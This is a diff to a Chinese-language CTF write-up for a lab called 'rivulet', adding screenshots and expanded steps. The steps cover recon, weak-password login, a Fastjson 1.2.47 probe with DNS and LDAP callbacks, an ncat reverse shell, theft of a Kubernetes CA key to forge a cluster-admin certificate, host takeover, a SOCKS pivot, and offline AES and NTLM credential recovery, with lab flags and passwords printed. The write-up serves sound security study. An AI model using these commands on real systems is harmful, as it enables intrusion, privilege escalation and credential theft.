@@ -20,6 +20,8 @@
 | flag3 | `flag3{2dfe8280-8a4f-473f-af3c-90bd80aea127}` | `.112` 域管桌面 `flag3.txt` |
 | flag4 | `flag4{35bdd403-4c3f-4065-bb24-bd0768479f70}` | `.83` 域管桌面 `flag4.txt` |
 
+![四个 flag 的位置](/content/rivulet/image-20.png)
+
 flag1 / flag2 在两个不同实例上取值完全一致，域 SID / krbtgt 也是。这批值是镜像内置的，不随实例变化。
 
 ![题目页](/content/rivulet/image-01.png)
@@ -76,7 +78,24 @@ flag3 的预期路线是 `test` RDP 进 `.112` 再本机提权。本次实际走
 
 ## 3. Fastjson 拿下容器
 
-入口就是 `8080` 上的论坛。指纹是 Spring Boot + Thymeleaf，Cookie 里 `rememberMe=deleteMe`，Shiro。目录爆破能看到登录和发帖接口。弱口令比预想更弱：任意 `username == password` 都能过。这是信息泄露 #1，Realm 是 demo 逻辑，不是真鉴权。
+入口就是 `8080` 上的论坛。旧实例先扫端口：只开了 `22` 和 `8080`。
+
+![nmap：22 和 8080](/content/rivulet/image-07.png)
+
+```bash
+nmap -sT -Pn --min-rate 10000 -p- $TARGET_IP
+# 22/tcp open ssh
+# 8080/tcp open http-proxy
+```
+
+指纹是 Spring Boot + Thymeleaf，Cookie 里 `rememberMe=deleteMe`，Shiro。目录爆破能看到 `/login/`。
+
+![dirsearch 命中 /login](/content/rivulet/image-08.png)
+![登录页](/content/rivulet/image-09.png)
+
+弱口令比预想更弱：任意 `username == password` 都能过。`admin/admin` 直接进论坛时间线。这是信息泄露 #1，Realm 是 demo 逻辑，不是真鉴权。
+
+![弱口令进入 Post Timeline](/content/rivulet/image-10.png)
 
 ```bash
 curl -s -m 10 -o /dev/null -w 'root=%{http_code}\n' "http://$TARGET_IP:8080/"
@@ -89,7 +108,12 @@ curl -s -b /tmp/ck -o /dev/null -w '%{redirect_url}\n' "http://$TARGET_IP:8080/"
 
 Shiro 常见的 149 个 rememberMe key（CBC / GCM / ECB / 零 IV）全试过，一个不中——**非预期解，别在 rememberMe 上耗时间**。
 
-发帖接口 `/create` 的 `content` 如果传 JSON 对象，会进 Fastjson 的 `@type` 解析。用 DNS 回调确认过：`content` 是对象时会走 `Inet4Address` gadget 触发解析，版本对得上 **1.2.47**。环境摸底：JDK **8u102**（`trustURLCodebase` 默认开，可走远程 codebase），Tomcat 9 / Boot 2，classpath 有 commons-collections 3.x / commons-beanutils / snakeyaml，没有 log4j2 / groovy / javassist。
+发帖接口 `/create` 的 `content` 如果传 JSON 对象，会进 Fastjson 的 `@type` 解析。Burp 里把 `content` 换成 `java.net.Inet4Address`，`val` 填 Interactsh 域名，DNS 立刻回了 A 记录——版本对得上 **1.2.47**。
+
+![Burp：/create 触发 Inet4Address](/content/rivulet/image-11.png)
+![Interactsh DNS 回调命中](/content/rivulet/image-12.png)
+
+环境摸底：JDK **8u102**（`trustURLCodebase` 默认开，可走远程 codebase），Tomcat 9 / Boot 2，classpath 有 commons-collections 3.x / commons-beanutils / snakeyaml，没有 log4j2 / groovy / javassist。
 
 `JdbcRowSetImpl` 的 JNDI lookup 无论成败都会 `ClassCastException` → 500，所以 HTTP 状态码当不了 oracle。**真信号是响应时间变长，加上跳板机上独立的 LDAP 回调。**
 
@@ -128,6 +152,8 @@ ssh jump 'cat /tmp/rv.out'
 这里有两个自杀陷阱。第一，`pkill -f` 的模式文本如果出现在同一条命令行里，会连自己的 shell 一起杀，所以写成 `"[n]cat ..."`。第二，后面不要再补 `< /dev/null`——它会覆盖掉 `< /tmp/rv.in`，ncat 的 stdin 变成空设备，壳就再也收不到命令。`setsid` 已经够用来防 SSH 断开时的 SIGHUP。
 
 结果：`root@52a205b59ba8`，容器 IP `172.17.0.2`，镜像 `shiro-web`，`/app/app.jar` 大约 21MB。容器里 `grep -rlI 'flag{' /` 是空的，flag 不在这一层。
+
+![容器 root：id / hostname](/content/rivulet/image-13.png)
 
 拿到容器之后先看 `.bash_history`。出题人把下一步写在了脸上：
 
@@ -195,7 +221,11 @@ done
 EOF
 ```
 
-落地后用 openssl 确认：`ca.crt` 的 subject 是 `CN = kubernetes`，`ca.key` 以 `-----BEGIN RSA PRIVATE KEY-----` 开头。然后用 CA 私钥签一张客户端证书，主体写成 `CN=admin, O=system:masters`。`system:masters` 是 k8s 内置超级组，签出来就是 cluster-admin，不需要再找 binding。
+落地后用 openssl 确认：`ca.crt` 的 subject 是 `CN = kubernetes`，`ca.key` 以 `-----BEGIN RSA PRIVATE KEY-----` 开头。
+
+![把 ca.crt / ca.key 抠到 k8s2/](/content/rivulet/image-14.png)
+
+然后用 CA 私钥签一张客户端证书，主体写成 `CN=admin, O=system:masters`。`system:masters` 是 k8s 内置超级组，签出来就是 cluster-admin，不需要再找 binding。
 
 ```bash
 openssl genrsa -out admin.key 2048
@@ -233,7 +263,13 @@ chmod 600；id > /host/root/pwnd.txt；sleep 100000
 flag1{1fbfaaf6-4810-4239-b8df-b182b3ea11d2}
 ```
 
-公钥已经在 `/root/.ssh/authorized_keys` 里，直接 SSH 进 `web`。宿主机上还能看到一份 `/Notes`（信息泄露 #4），里面是运维事件日志，其中一条写了 `Change the password to a strong one: 2835c8c60e654e7a1a8bd2e51059d9b3`。这串对 root / ubuntu / test / admin / web 都试过，不是 SSH 口令；旧实例在残缺拓扑上把它当成 flag4 线索，走空了。`/home/web/.bash_history` 是个指向别处的符号链接，读不到内容。docker 只有 `shiro-web` 一个业务容器，镜像、卷、overlay2 里都没有第二个 flag。k8s Secret 只有 SA token，etcd 的 data 目录 strings 过也没有 flag。宿主全盘 `grep -rlI 'flag{' /`（排除 `/proc` `/sys` `/dev`）只有 `/flag1`。
+![pwnhost Running，读到 /host/flag1](/content/rivulet/image-15.png)
+
+公钥已经在 `/root/.ssh/authorized_keys` 里，直接 SSH 进 `web`。
+
+![SSH 落到宿主 root@web](/content/rivulet/image-16.png)
+
+宿主机上还能看到一份 `/Notes`（信息泄露 #4），里面是运维事件日志，其中一条写了 `Change the password to a strong one: 2835c8c60e654e7a1a8bd2e51059d9b3`。这串对 root / ubuntu / test / admin / web 都试过，不是 SSH 口令；旧实例在残缺拓扑上把它当成 flag4 线索，走空了。`/home/web/.bash_history` 是个指向别处的符号链接，读不到内容。docker 只有 `shiro-web` 一个业务容器，镜像、卷、overlay2 里都没有第二个 flag。k8s Secret 只有 SA token，etcd 的 data 目录 strings 过也没有 flag。宿主全盘 `grep -rlI 'flag{' /`（排除 `/proc` `/sys` `/dev`）只有 `/flag1`。
 
 ```bash
 ssh -o StrictHostKeyChecking=no -i ~/.ssh/id_ed25519 root@$TARGET_IP
@@ -241,6 +277,8 @@ ssh -i ~/.ssh/id_ed25519 -D 1081 -N -f root@$TARGET_IP
 ss -ltnp | grep 1081
 proxychains4 -q -f pc4.conf nxc smb 192.168.1.123 192.168.1.112 192.168.1.83
 ```
+
+![SOCKS 1081 起来](/content/rivulet/image-17.png)
 
 代理配错是后面最容易绕晕的地方。有的脚本还硬编码着上一轮的 SOCKS **1080**（frp visitor），这次隧道是 **1081**。`krun.py` / `kapi.sh` 都要改成仓库里的 `pc4.conf`，证书目录改成 `k8s2/`。`api.py` / `bdump.py` 本来就走 1081，不用动。
 
@@ -277,6 +315,8 @@ flag2{9f23aa16-33e7-11f1-9508-7e92a294591d}
 hint: Can you decrypt AES?
 ```
 
+![bdump 出 flag2，aes.py 解出 test](/content/rivulet/image-18.png)
+
 `informations` 每人一把 32 字符 ASCII 的 `key`，`login` 存 `hash` 和密文 `passwd`。AES 这边踩过一次填充：
 
 - 算法是 **AES-256-ECB**
@@ -303,6 +343,8 @@ hashlib.new('md4', b'dh$%gdWKD62a'.encode('utf-16-le')).hexdigest()
 # 507f900f67d2a00d4bd77799745689f0
 # == MICHA.COM\test
 ```
+
+![内网三台 SMB 探活，离线算出 test 的 NTLM](/content/rivulet/image-19.png)
 
 | 用户名 | 口令 | 是否真实 |
 |------|------|----------|
